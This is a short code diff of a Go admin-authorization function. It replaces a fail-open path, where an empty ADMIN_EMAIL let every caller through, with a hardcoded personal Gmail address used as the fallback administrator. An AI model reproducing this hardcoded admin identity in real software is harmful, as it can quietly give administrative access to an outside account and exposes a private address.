@@ -262,7 +262,7 @@ func requireAdmin(ctx context.Context) error {
 
 	adminEmail := strings.TrimSpace(strings.ToLower(os.Getenv("ADMIN_EMAIL")))
 	if adminEmail == "" {
-		return nil
+		adminEmail = "homsiahmed16@gmail.com"
 	}
 
 	var email string
